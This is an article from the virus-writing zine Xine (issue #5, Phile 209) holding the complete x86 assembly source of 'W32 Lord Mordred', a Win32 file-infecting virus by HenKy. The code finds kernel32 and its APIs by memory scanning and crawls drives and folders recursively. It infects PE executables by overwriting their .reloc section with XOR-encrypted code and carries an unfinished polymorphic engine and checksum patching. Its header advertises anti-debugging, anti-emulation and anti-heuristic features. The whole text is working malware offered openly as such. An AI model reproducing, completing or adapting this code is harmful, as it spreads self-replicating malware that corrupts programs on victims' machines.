
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 209 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ







      ;---------------------  W32 LORD MORDRED BY HenKy ---------------------------;
      ;                                                                            ;
      ;-AUTHOR:        HenKy                                                       ;
      ;                                                                            ;
      ;-MAIL:          HenKy_@latinmail.com                                        ;
      ;                                                                            ;
      ;-ORIGIN:        SPAIN                                                       ;
      ;                                        ;
      ;-TARGET'S:      PE EXE,                         ;
      ;-OS'S:          W32                             ;
      ;-PARASITIC      YES                             ;
      ;-MULTIPARTITE   NO                              ;
      ;-RESIDENT:      YES                             ;
      ;-STEALTH:       NO                              ;
      ;-THREADS:       YES                             ;
      ;-KERNEL SEARCH: YES                             ;
      ;-API SEARCH:    YES                             ;
      ;-ENCRYPTED:     YES                             ;
      ;-POLYMORPHIC:   YES (UNFINISHED)                        ;
      ;-METAMORPHIC:   NO                                  ;
      ;-ANTIDEBUGGER:  YES                             ;
      ;-ANTITRACE:     YES                             ;
      ;-ANTIEMULATOR:  YES                             ;
      ;-ANTIDISASM:    YES                             ;
      ;-ANTIHEURISTIC: YES                             ;
      ;-ANTIBAIT:      YES                             ;
      ;-ERROR HANLING: YES                             ;
      ;-RETRO:         YES                             ;
      ;-COMPRESSION:   YES                             :
      ;-EPO:           YES                             ;
      ;-ANTIWATCHDOGS: YES                             ;
      ;-CHECKSUM:      YES                             ;
      ;-100% OWN CODE: YES                             ;
      ;-OPTIMIZATIONS: YES                             ;
      ;----------------------------------------------------------------------------;

   ;                       WELCOME TO THE LORD MORDRED...   *^_^*



   ; MAY BE MY LAST VIRUS....
   ; IM TOO BORED TO FINISH IT ...

   ; MAYBE MAKE IT METAMORPHIC... ???

   ; ???

   .586P
   ;PMMX
   .MODEL FLAT
   LOCALS


   EXTRN       ExitProcess:PROC

   MIX_SIZ     EQU FILE_END-MEGAMIX
   MIX_MEM     EQU MEM_END-MEGAMIX
   MARKA       EQU 66
   FLAGZ       EQU 00000020H OR 20000000H OR 80000000H


   MACROSIZE MACRO

           DB      MIX_SIZ/01000 MOD 10 + "0"
           DB      MIX_SIZ/00100 MOD 10 + "0"
           DB      MIX_SIZ/00010 MOD 10 + "0"
           DB      MIX_SIZ/00001 MOD 10 + "0"

           ENDM

   MACROMEM MACRO

           DB      MIX_MEM/01000 MOD 10 + "0"
           DB      MIX_MEM/00100 MOD 10 + "0"
           DB      MIX_MEM/00010 MOD 10 + "0"
           DB      MIX_MEM/00001 MOD 10 + "0"

           ENDM

   MACROHEAP MACRO

           DB      (MIX_MEM-MIX_SIZ)/01000 MOD 10 + "0"
           DB      (MIX_MEM-MIX_SIZ)/00100 MOD 10 + "0"
           DB      (MIX_MEM-MIX_SIZ)/00010 MOD 10 + "0"
           DB      (MIX_MEM-MIX_SIZ)/00001 MOD 10 + "0"

           ENDM

   .DATA
           DB       'PHYSICAL SIZE = '

           MACROSIZE

           DB       ' BYTES',0

           DB       'VIRTUAL SIZE = '

           MACROMEM

           DB       ' BYTES',0

           DB       'CODE IN HEAP = '

           MACROHEAP

           DB       ' BYTES',0

   .CODE

   FAKE:
           CALL    DELTA2

   DELTA2: POP     ESI
           LEA     ESI,[ESI+MEGAMIX-DELTA2]
           SUB     ESP,MIX_MEM
           MOV     EDI,ESP
           PUSH    MIX_MEM
           POP     ECX
           REP     MOVSB
           LEA     ECX,[ESP+TRICK]
           MOV     EAX,[ESP+MIX_MEM]
           JMP     ECX
   ALIGN 4

   MEGAMIX:
           MOV     EAX,[ESP+MIX_MEM-4]
           TRICK   EQU $-MEGAMIX
   START:
           CALL    DELTA
   DELTA:  POP     EBP

           CALL    CYPHERER

   CRYPTOTRON:

           XOR     AX,AX
     SZ:
           CMP     BYTE PTR [EAX],'M'
           JZ      F_GPA
           SUB     EAX,1000H
           JMP     SZ

   F_GPA:
           LEA     ESI,[EBP+GPA_95-DELTA]
           MOV     EDI,EAX
           PUSH    EAX
           BSWAP   EAX

           CMP     AL,0BFH
           JZ      SCANIT
           CMP     AH,0F0H
           JZ      WNT
   W2000:
           ADD     ESI,8

   WNT:
           ADD     ESI,8

   SCANIT:
           MOV     EDX,800000

   SCANKRNL:

           PUSH    8
           POP     ECX
           PUSH    ESI
           PUSH    EDI
           REPZ    CMPSB
           POP     EDI
           POP     ESI
           JZ      FOUND
           INC     EDI
           DEC     EDX
           JZ      WARNING
           JMP     SCANKRNL

   FOUND:
           INC     EDI
           INC     EDI
           INC     EDI
           MOV     [EBP+GPA-DELTA], EDI
           POP     EBX


   API_DECOMPRESSOR:

           PUSHAD
           LEA     ESI, [EBP+APIs-DELTA]
           LEA     EDI, [EBP+APIBUFF-DELTA]
   DEPACK:
           PUSH    6
           POP     ECX
           XOR     EBX,EBX
           LODSB
           TEST    AL,AL
           JZ      ZOPSB
           CMP     AL,'X'
           JZ      END_UN
           CMP     AL,9
           JB      LOADZ
   ZOPSB:  STOSB
           JMP     DEPACK

   LOADZ:
           PUSH    ESI
           LEA     ESI,[EBP+API_TBL-DELTA]
           CMP     AL,1
           JZ      PUT_1
           CMP     AL,2
           JZ      PUT_2
           CMP     AL,3
           JZ      PUT_3
           CMP     AL,4
           JZ      PUT_4
           CMP     AL,5
           JZ      PUT_5
           CMP     AL,6
           JZ      PUT_6
           CMP     AL,7
           JZ      PUT_7

   PUT_8:
           PUSH    11
           POP     ECX
           PUSH    32
           POP     EBX
           JMP     BOCOI

   PUT_7:  PUSH    26
           POP     EBX
           JMP     BOCOI

   PUT_6:  PUSH    3
           POP     ECX
           PUSH    23
           POP     EBX
           JMP     BOCOI

   PUT_5:  PUSH    3
           POP     ECX
           PUSH    20
           POP     EBX
           JMP     BOCOI

   PUT_4:  PUSH    14
           POP     EBX
           JMP     BOCOI

   PUT_3:  PUSH    4
           POP     ECX
           PUSH    10
           POP     EBX
           JMP     BOCOI

   PUT_2:  PUSH    ECX
           POP     EBX
           PUSH    4
           POP     ECX
           JMP     BOCOI

   PUT_1:

   BOCOI:
           ADD     ESI,EBX
           REP     MOVSB
           POP     ESI
           JMP     DEPACK

   END_UN: STOSB
           POPAD

           LEA     ESI, [EBP+APIBUFF-DELTA]
           LEA     EDI, [EBP+APIaddresses-DELTA]

   GPI:    PUSH    ESI
           PUSH    EBX
           CALL    [EBP+GPA-DELTA]
           CLD
           STOSD

    NPI:
           LODSB
           TEST    AL, AL
           JNZ     SHORT NPI
           CMP     [ESI], AL
           JNZ     GPI

   THREAD_C:

           ;PUSH    -2
           ;PUSH    -2
           ;CALL    DWORD PTR [EBP+SetThreadPriority-DELTA]

           ;CDQ
           ;LEA     EAX,[EBP+THR-DELTA]
           ;PUSH    EAX
           ;PUSH    EDX
           ;PUSH    EDX
           ;LEA     EAX,[EBP+WARNING-DELTA]
           ;PUSH    EAX
           ;PUSH    EDX
           ;PUSH    EDX
           ;CALL    DWORD PTR [EBP+CreateThread-DELTA]

           ;CALL    DELAY

   BUCLE:
           CALL    INFECT
           PUSH    8
           POP     ECX
   SLOOP:
           PUSH    ECX
           LEA     EDX, [EBP+DRIV-DELTA]
           INC     BYTE PTR [EDX]
           CALL    SCANNER
           POP     ECX
           LOOP    SLOOP
           MOV     BYTE PTR [EBP+DRIV-DELTA],'B'
           ;JMP     BUCLE


   WARNING:

           MOV     EDI,12345678H
           ZONE    EQU $-4
           ADD     ESP,(MIX_MEM-4)
           PUSH    EDI
       MOV     ESI,12345678H
           BASS    EQU $-4
           PUSH    POLY_SIZ/4
           POP     ECX
           REP     MOVSD

           MOV     AL,BYTE PTR [EBP+LLAVE-DELTA]
           PUSH    POLY_SIZ
           POP     ECX
           POP     EDI
           PUSH    EDI
   POK@:
           XOR     BYTE PTR [EDI],AL
           INC     EDI
           LOOP    POK@

           RET

   DRIV    DB      'B:\',0

   INFECT:

           ;CALL    DELAY
           LEA     EAX, [EBP+OFFSET Win32FindData-DELTA]
           PUSH    EAX
           LEA     EAX, [EBP+OFFSET IMASK-DELTA]
           PUSH    EAX
           CALL    DWORD PTR [EBP+FindFirstFile-DELTA]
           MOV     DWORD PTR [EBP+SearcHandle-DELTA],EAX


   LOOPER:
           INC     EAX
           JZ      RETOX
           DEC     EAX
           TEST    EAX,EAX
           JNZ     ALLKEY
   RETOX:
           RET

   ALLKEY:


           PUSH    DWORD PTR [EBP+BASS-DELTA]
           PUSH    DWORD PTR [EBP+ZONE-DELTA]
           PUSH    DWORD PTR [EBP+LLAVE-DELTA]
           LEA     EBX ,[EBP+offset FNAME-DELTA]        ; OPEN IT!

           MOV     EAX, DWORD PTR [EBP+WFD_dwFileAttributes-DELTA]
           AND     AL, NOT 00000001b

       PUSH    EAX
       PUSH    EBX
       CALL    DWORD PTR [EBP+SetFileAttributesA-DELTA]

           CDQ
           PUSH    EDX
           PUSH    80h
           PUSH    3
           PUSH    EDX
           PUSH    EDX
           PUSH    0C0000000h
           PUSH    EBX
           CALL    DWORD PTR [EBP+CreateFile-DELTA]

           INC     EAX
           JZ      Cerrar
           DEC     EAX
           MOV     DWORD PTR [EBP+FileHandle-DELTA],EAX  ; SAVE HNDL
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CDQ
           PUSH    EDX
           PUSH    ECX
           PUSH    EDX
           PUSH    4H
           PUSH    EDX
           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CreateFileMappingA-DELTA]
           TEST    EAX,EAX
           JNZ     CONTNUE

   Cerrar:

           POP     DWORD PTR [EBP+LLAVE-DELTA]
           POP     DWORD PTR [EBP+ZONE-DELTA]
           POP     DWORD PTR [EBP+BASS-DELTA]

           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

           LEA     EAX, [EBP+offset Win32FindData-DELTA]
           PUSH    EAX
           PUSH    DWORD PTR [EBP+SearcHandle-DELTA]
           CALL    DWORD PTR [EBP+FindNextFile-DELTA]
           JMP     LOOPER

   CONTNUE:

           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CDQ
           PUSH    ECX
           PUSH    EDX
           PUSH    EDX
           INC     EDX
           INC     EDX
           PUSH    EDX
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+MapViewOfFile-DELTA]
           TEST    EAX,EAX
           JZ      Cerrar

           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX
           MOV     ESI,EAX                         ; GET PE HDR
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           CMP     BYTE PTR [ESI],"P"            ; IS A 'P'E ?
           JNZ     Cerrar
           MOV     EDI,ESI

           MOV     EBX,[ESI+74H]
           SHL     EBX,3           ; MAKE FIRST SECTION WRITEABLE
           ADD     ESI,78H
           ADD     ESI,EBX
           OR      DWORD PTR [ESI+24H],FLAGZ
           MOV     EDX,[ESI+12]
           SUB     EDX,[ESI+20]
           MOV     DWORD PTR [EBP+SUBBER-DELTA],EDX
           MOV     EAX,[ESI+8]
           ADD     EAX,[ESI+12]
           MOV     DWORD PTR [EBP+SIZO-DELTA],EAX

           MOV     EBX,[EDI+28H]
           MOV     EAX,12345678H
           SIZO    EQU $-4
           CMP     EAX,EBX
           JB      Cerrar

           CMP     BYTE PTR [EDI+MARKA],"H"     ; HenKy IS HERE ?
           JZ      Cerrar

           XOR     ECX,ECX
           MOV     CL,BYTE PTR [EDI+6]
           PUSH    ESI

   SERCH:
           CMP     DWORD PTR [ESI],"ler."
           JZ      NIZE
           ADD     ESI,40
           LOOP    SERCH
           POP     ESI
           JMP     Cerrar

   NIZE:
           POP     ECX
           MOV     ECX,[EDI+3CH]
           MOV     EBX,[EDI+56]
           CMP     ECX,EBX
           JNZ     NIXX
           CDQ
           MOV     [EBP+SUBBER-DELTA],EDX

   NIXX:

           MOV     DWORD PTR [ESI],"adr."
           MOV     WORD PTR  [ESI+4],"at"
           CMP     DWORD PTR [ESI+8],MIX_SIZ
           JB      Cerrar

           MOV     EAX,[ESI+20]
           MOV     DWORD PTR [EBP+NEW_EIP-DELTA],EAX

           MOV     EAX,[ESI+12] ; RVA
           ADD     EAX,[EDI+34H]     ; IMAGE BASE
           MOV     [EBP+BASS-DELTA],EAX

   OKA:
           PUSHAD                      ; SAVE OLD DATA
           MOV     ESI,[EDI+28H]
           ADD     ESI,[EDI+34H]
           MOV     [EBP+ZONE-DELTA],ESI
           SUB     ESI,[EDI+34H]
           SUB     ESI,12345678h
           SUBBER  EQU $-4
           ADD     ESI,DWORD PTR [EBP+MapAddress-DELTA]

           PUSHAD
       RD:
           DB      0FH,31H
           CMP     AL,0
           JE      RD
           MOV     BYTE PTR [EBP+LLAVE-DELTA],AL
           PUSH    POLY_SIZ
           POP     ECX
      PO@:
           XOR     BYTE PTR [ESI],AL
           INC     ESI
           LOOP    PO@

           POPAD

           MOV     EDI,12345678H
           NEW_EIP EQU $-4
           ADD     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           PUSH    POLY_SIZ/4
           POP     ECX
           REP     MOVSD
           POPAD

           CALL    ENGINE
           PUSHAD
           MOV     BYTE PTR [EDI+MARKA],"H"     ; HenKy RULEEZZ
           MOV     EDI,[EDI+28H]
           ADD     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           SUB     EDI,DWORD PTR [EBP+SUBBER-DELTA]
           LEA     ESI,[EBP+POLYBUFF-DELTA] ; COPY NEW DATA
           PUSH    POLY_SIZ/4
           POP     ECX
           REP     MOVSD
           POPAD

           CDQ
           CMP     DWORD PTR [EDI+58H], EDX
       JZ      UnMapFile
           MOV     DWORD PTR [EDI+58H], EDX
           MOV     ESI, [EBP+MapAddress-DELTA]
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           SHR     ECX, 1

   CHK_LOOP:

           MOVZX   EAX, WORD PTR [ESI]
           ADD     EDX, EAX
       MOV     EAX, EDX
       AND     EDX, 0FFFFh
       SHR     EAX, 16
       ADD     EDX, EAX
       INC     ESI
           INC     ESI
           LOOP    CHK_LOOP
           MOV     EAX, EDX
       SHR     EAX, 16
           ADD     AX, DX
           ADD     EAX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           MOV     DWORD PTR [EDI+58H], EAX

   UnMapFile:

           PUSH    DWORD PTR [EBP+MapAddress-DELTA]
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]

   CloseMap:

           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]
           JMP     Cerrar


   DELAY:
           ;PUSH    10000
           ;CALL    DWORD PTR [EBP+Sleep-DELTA]
           ;RET

   SET_DIR:

            PUSH    EDX
            CALL    [EBP+SetCurrentDirectory-DELTA]
            ;CALL    DELAY
            RET

   SCANNER:

            CALL    SET_DIR

   RECURSIVE:

            CALL    INFECT
            LEA     EAX, [EBP+Win32FindData-DELTA]
            PUSH    EAX
            LEA     EAX, [EBP+DIR2-DELTA]
            PUSH    EAX
            CALL    [EBP+FindFirstFile-DELTA]
            MOV     EDI, EAX
            INC     EAX
            JZ      NOMORE

   PROCESS:

            LEA     EAX, [EBP+WFD_dwFileAttributes-DELTA]
            MOV     AL, [EAX]
            CMP     AL, 10H
            JNE     NEXT
            LEA     EDX, [EBP+FNAME-DELTA]
            CMP     BYTE PTR [EDX], '.'
            JE      NEXT
            CALL    SET_DIR
            PUSH    EDI
            LEA     EDX, [EBP+FNAME-DELTA]
            CALL    RECURSIVE
            POP     EDI
            LEA     EDX, [EBP+PDIR-DELTA]
            CALL    SET_DIR

   NEXT:

            LEA     EAX, [EBP+Win32FindData-DELTA]
            PUSH    EAX
            PUSH    EDI
            CALL    [EBP+FindNextFile-DELTA]
            OR      EAX, EAX
            JNZ     PROCESS

   NOMORE:

           RET



   CRYPT_SIZ EQU $-CRYPTOTRON

         ;---------------------------------------------------------------------------;
         ;                       POLYMORPHIC ENGINE STARTS HERE                      ;
         ;---------------------------------------------------------------------------;

   ENGINE:

           PUSHAD
           DB       0FH,31H
           MOV      BYTE PTR [EBP+KEY-DELTA],AL
           CALL     CYPHERER
           LEA      ESI,[EBP+FILE_END-DELTA]
           LEA      EDI,[EBP+POLYBUFF-DELTA]

           PUSH     ESI
           LEA      ESI,[EBP+FIX-DELTA]
           MOV      ECX,FIX_SIZ
           REP      MOVSB
           POP      ESI

           MOV      ECX,((MIX_SIZ/4)-1)
      LLOP:
           SUB      ESI,8
           MOV      AL,'h'
           STOSB
           MOVSD
           JMP      GARBAHE
       @L:
           LOOP     LLOP

           MOV      AX,0E4FFH
           STOSW
           CALL     CYPHERER
           POPAD
           RET

   GARBAHE:

           PUSH     ESI
           LEA      ESI,[EBP+ONE_BYTERS-DELTA]
      BAHE:
           DB       0FH,31H
           ADD      AL,AH
           CMP      AL,10
           JAE      BAHE
           XOR      AH,AH
           BSWAP    EAX
           XOR      AX,AX
           BSWAP    EAX
           ADD      ESI,EAX
           LODSD
           STOSD
           POP      ESI
           JMP      @L


   CYPHERER:

           PUSH     EBP
           MOV      ECX,CRYPT_SIZ
           ADD      EBP,(CRYPTOTRON-DELTA)
           CALL     CRP

           ADD      EBP,NO_ME_RAYES
           MOV      ECX,(FILE_END-APIs)
           CALL     CRP
           POP      EBP
           RET

   CRP:
           XOR      BYTE PTR [EBP],0
           KEY      EQU $-1
           INC      EBP
           LOOP     CRP
           RET

   ONE_BYTERS:

       DB  040H,041H,042H,043H,045H,046H,047H
           DB      048H,049H,04AH,04BH,04DH,04EH,04FH
       DB  090H,091H,092H,093H,094H,095H,096H
       DB  027H,02FH,03FH,0D4H,0D5H,0ECH,09FH
       DB  098H,099H,09EH,0F8H,0F9H,0FCH,0FDH
           DB      0F5H,097H,90H,90H,90H

   FIX:
           SUB      ESP,(MIX_MEM-MIX_SIZ)
           FIX_SIZ  EQU $-FIX

   NO_ME_RAYES EQU $-ENGINE

   ;Create            = 01H
   ;File              = 02H
   ;Find              = 03H
   ;ViewOf            = 04H
   ;Map               = 05H
   ;Set               = 06H
   ;Thread            = 07H
   ;AttributesA       = 08H

   APIs:
           DB      01H,02H,"A",0
           DB      "CloseHandle",0
           DB      03H,"First",02H,"A",0
           DB      03H,"Next",02H,"A",0
           DB      "Read",02H,0
           DB      05H,04H,02H,0
           DB      "Unmap",04H,02H,0
           DB      01H,02H,05H,"pingA",0
           DB      06H,"CurrentDirectoryA",0
           DB      01H,07H,0
           DB      06H,07H,"Priority",0
           DB      "Sleep",0
           DB      06H,02H,08H,0
   Zero_   DB       0
           DB      "X"

   APIX_SIZ EQU      $-APIs

   API_TBL:

       DB "Create"            ; 6
       DB "File"              ; 4
       DB "Find"              ; 4
       DB "ViewOf"            ; 6
       DB "Map"               ; 3
       DB "Set"               ; 3
       DB "Thread"            ; 6
       DB "AttributesA"       ;11


   GPA_95  DB      0C2H,04H,00H,57H,6AH,22H,2Bh,0D2H

   GPA_NT  DB      0C2H,04H,00H,55H,8Bh,4CH,24H,0CH

   GPA_2KB DB      48H,03H,00H,55H,8Bh,0ECh,51H,51H

   ;GPA_2K  DB      00FH,00H,00H,55H,8Bh,0ECh,51H,51H

   IMASK   DB      "*.ZZZ",0
   DIR2    DB      "*.",0
   PDIR    DB      "..",0
   LLAVE               DB 0

           DB       'LORD MORDRED by HenKy'
           DB       4 DUP (0)

           ALIGN 4


   FILE_END   LABEL BYTE



   APIaddresses:

   CreateFile          DD 0
   CloseHandle         DD 0
   FindFirstFile       DD 0
   FindNextFile        DD 0
   ReadFile            DD 0
   MapViewOfFile       DD 0
   UnmapViewOfFile     DD 0
   CreateFileMappingA  DD 0
   SetCurrentDirectory DD 0
   CreateThread        DD 0
   SetThreadPriority   DD 0
   Sleep               DD 0
   SetFileAttributesA  DD 0

   THR                 DD 0
   GPA                 DD 0
   SearcHandle         DD 0
   FileHandle          DD 0
   MapHandle           DD 0
   MapAddress          DD 0

   APIBUFF             DB APIX_SIZ DUP (0)
   POLYBUFF            DB (2*(FILE_END-MEGAMIX) + ((FILE_END-MEGAMIX)/4)) DUP (0)

   POLY_SIZ            EQU $-APIBUFF

   FILETIME  STRUC

   FT_dwLowDateTime    DD ?
   FT_dwHighDateTime   DD ?

   FILETIME   ENDS

   Win32FindData:

   WFD_dwFileAttributes    DD 0
   WFD_ftCreationTime      FILETIME ?
   WFD_ftLastAccessTime    FILETIME ?
   WFD_ftLastWriteTime     FILETIME ?
   WFD_nFileSizeHigh       DD 0
   WFD_nFileSizeLow        DD 0
   WFD_dwReserved0         DD 0
   WFD_dwReserved1         DD 0
   FNAME                   DB 260H  DUP (0)


   MEM_END   LABEL BYTE

   EXITPROC:

            PUSH 0
            CALL ExitProcess

   ENDS
   END FAKE
